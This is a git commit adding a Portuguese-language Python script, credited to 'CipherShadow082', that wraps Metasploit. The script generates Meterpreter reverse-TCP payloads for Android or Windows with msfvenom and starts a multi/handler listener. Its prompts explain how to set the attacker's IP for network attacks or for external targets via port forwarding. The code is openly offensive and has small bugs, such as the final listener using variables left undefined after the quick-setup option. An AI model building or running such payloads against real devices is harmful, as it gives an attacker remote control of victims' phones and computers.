57222722c5ceeda21a244b790a0b5b0f1d3e5058
CipherShadow082 <ciphershadow61@gmail.com>
2025-03-31 21:27:53 -0300

    Add files via upload

---
+++ htw.py
@@ -0,0 +1,127 @@
+import os
+import time
+while True:
+    ascii ="""
+
+    ⠀⠀⣠⣴⣶⣿⣿⠿⣷⣶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣶⣷⠿⣿⣿⣶⣦⣀⠀⠀⠀⠀⠀
+⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣶⣦⣬⡉⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠚⢉⣥⣴⣾⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀
+⠀⠀⠀⡾⠿⠛⠛⠛⠛⠿⢿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⣿⣿⣿⣿⣿⠿⠿⠛⠛⠛⠛⠿⢧⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⡿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⣠⣤⠶⠶⠶⠰⠦⣤⣀⠀⠙⣷⠀⠀⠀⠀⠀⠀⠀⢠⡿⠋⢀⣀⣤⢴⠆⠲⠶⠶⣤⣄⠀⠀⠀⠀⠀⠀⠀
+⠀⠘⣆⠀⠀⢠⣾⣫⣶⣾⣿⣿⣿⣿⣷⣯⣿⣦⠈⠃⡇⠀⠀⠀⠀⢸⠘⢁⣶⣿⣵⣾⣿⣿⣿⣿⣷⣦⣝⣷⡄⠀⠀⡰⠂⠀
+⠀⠀⣨⣷⣶⣿⣧⣛⣛⠿⠿⣿⢿⣿⣿⣛⣿⡿⠀⠀⡇⠀⠀⠀⠀⢸⠀⠈⢿⣟⣛⠿⢿⡿⢿⢿⢿⣛⣫⣼⡿⣶⣾⣅⡀⠀
+⢀⡼⠋⠁⠀⠀⠈⠉⠛⠛⠻⠟⠸⠛⠋⠉⠁⠀⠀⢸⡇⠀⠀⠄⠀⢸⡄⠀⠀⠈⠉⠙⠛⠃⠻⠛⠛⠛⠉⠁⠀⠀⠈⠙⢧⡀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡇⢠⠀⠀⠀⢸⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⡇⠀⠀⠀⠀⢸⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠟⠁⣿⠇⠀⠀⠀⠀⢸⡇⠙⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠰⣄⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⠖⡾⠁⠀⠀⣿⠀⠀⠀⠀⠀⠘⣿⠀⠀⠙⡇⢸⣷⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠄⠀
+⠀⠀⢻⣷⡦⣤⣤⣤⡴⠶⠿⠛⠉⠁⠀⢳⠀⢠⡀⢿⣀⠀⠀⠀⠀⣠⡟⢀⣀⢠⠇⠀⠈⠙⠛⠷⠶⢦⣤⣤⣤⢴⣾⡏⠀⠀
+⠀⠀⠈⣿⣧⠙⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠘⠛⢊⣙⠛⠒⠒⢛⣋⡚⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⡿⠁⣾⡿⠀⠀⠀
+⠀⠀⠀⠘⣿⣇⠈⢿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⡿⢿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⡟⠁⣼⡿⠁⠀⠀⠀
+⠀⠀⠀⠀⠘⣿⣦⠀⠻⣿⣷⣦⣤⣤⣶⣶⣶⣿⣿⣿⣿⠏⠀⠀⠻⣿⣿⣿⣿⣶⣶⣶⣦⣤⣴⣿⣿⠏⢀⣼⡿⠁⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠘⢿⣷⣄⠙⠻⠿⠿⠿⠿⠿⢿⣿⣿⣿⣁⣀⣀⣀⣀⣙⣿⣿⣿⠿⠿⠿⠿⠿⠿⠟⠁⣠⣿⡿⠁⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠈⠻⣯⠙⢦⣀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⣠⠴⢋⣾⠟⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠙⢧⡀⠈⠉⠒⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠐⠒⠉⠁⢀⡾⠃⠀⠀⠀⠀⠀⠀⠀By: CipherShadow08⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⣄⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⣠⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀ github.com/CipherShadow082
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢦⡀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⢀⡴⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀t.me/CipherShadow08
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+    """
+    asci2 = ("\033[35m" + ascii + "\033[0m")
+    print (asci2)
+
+    tabela = ("""
+\033[35m┌────────────────────────────────┐
+│        \033[36mSelecione uma Opção\033[35m
+├────────────────────────────────┤
+│ \033[33m[01]\033[35m Quick Setup │\033[33m[02]\033[35m Custom
+├────────────────────────────────┤
+│ \033[31m[00]\033[35m Sair      │
+└────────────────────────────────┘\033[0m
+""")
+
+    tabela2 = ("\033[35m" + tabela + "\033[35m") 
+    print(tabela2)
+    escolha1 = input("Type: ")
+    if escolha1 == "00":
+        break
+
+    if escolha1 not in ["01", "02", "00"]:
+        print("Resposta invalida!...")
+        time.sleep(1)
+        os.system("clear")
+    
+
+    time.sleep(1)
+    # Exibição inicial
+    print("\n\033[35m┌─────────────────────────────────────────────────┐")
+    print("│          \033[36mEscolha o Alvo do Payload\033[35m          │")
+    print("└─────────────────────────────────────────────────┘\033[0m")
+
+    # Instruções para o usuário
+    print("\033[33mEscolha um alvo:\033[0m")
+    print("\033[32m[1] Android (Meterpreter Reverse TCP)\033[0m")
+    print("\033[32m[2] Windows (Meterpreter Reverse TCP)\033[0m")
+    # Entrada de dados
+    alvo = input("\n\033[32mDigite o número do seu alvo (1 ou 2): \033[0m")
+
+# Definindo o alvo
+
+    def definir_alvo(alvo):
+        if alvo == "1":
+           return "android/meterpreter/reverse_tcp"
+        if alvo == "2":
+           return "windows/meterpreter/reverse_tcp"
+    alvo1 = definir_alvo(alvo)
+
+    def arquivo_payload(alvo):
+        if alvo =="1":
+            return ""
+        if alvo =="2":
+            return"-f exe"
+
+    arquivo = arquivo_payload(alvo)
+    if escolha1 == "01":
+        ("\n\033[33m➤ Nome do arquivo final do payload.")
+        print("  - Exemplo: \033[34mpayload.exe\033[0m")
+        payload = input("\033[32m[+] Digite o nome do arquivo de saída: \033[0m")
+        criar2 = f"msfvenom -p {alvo1} LHOST=localhost LPORT=4444 {arquivo} -o {payload}"
+        os.system(criar2)
+        ouvir_payload = f"msfconsole -x 'use exploit/multi/handler; set payload {alvo1}; set LHOST localhost; set LPORT 4444; exploit'"
+        os.system(ouvir_payload)
+    
+    if escolha1 == "02":
+        print("\n\033[33m➤ LHOST é o IP que receberá a conexão reversa.")
+        print("  - Para testes locais, use: \033[34mlocalhost\033[0m ou \033[34m127.0.0.1\033[0m")
+        print("  - Para ataques na rede, use seu IP local (ex: 192.168.X.X)")
+        print("  - Para conexões externas, use seu IP público e faça Port Forwarding.")
+        lhost = input("\033[32m[+] Digite o LHOST: \033[0m")
+
+        # Explicação sobre LPORT
+        print("\n\033[33m➤ LPORT é a porta que o Metasploit irá escutar.")
+        print("  - O padrão é \033[34m4444\033[0m, mas você pode escolher outra.")
+        lport = input("\033[32m[+] Digite a Porta: \033[0m")
+
+        # Explicação sobre o nome do arquivo
+        print("\n\033[33m➤ Nome do arquivo final do payload.")
+        print("  - Exemplo: \033[34mpayload.exe\033[0m")
+        payload = input("\033[32m[+] Digite o nome do arquivo de saída: \033[0m")
+
+        time.sleep(1)
+        print("\n\033[35mGerando payload...\033[0m")
+
+        criar = f"msfvenom -p {alvo1} LHOST={lhost} LPORT={lport} {arquivo} -o {payload}"
+        os.system (criar)
+
+    print("\n\033[35m┌────────────────────────────────────────────────────────────┐")
+    print("│             \033[36mOuvindo Seu Payload, Aguarde...          \033[35m│")
+    print("└────────────────────────────────────────────────────────────┘\033[0m")
+
+    print("\033[33m[*] Aguardando conexão do payload...\033[0m")
+
+    ouvir_payload = f"msfconsole -x 'use exploit/multi/handler; set payload {alvo1}; set LHOST {lhost}; set LPORT {lport}; exploit'"
+    os.system(ouvir_payload)
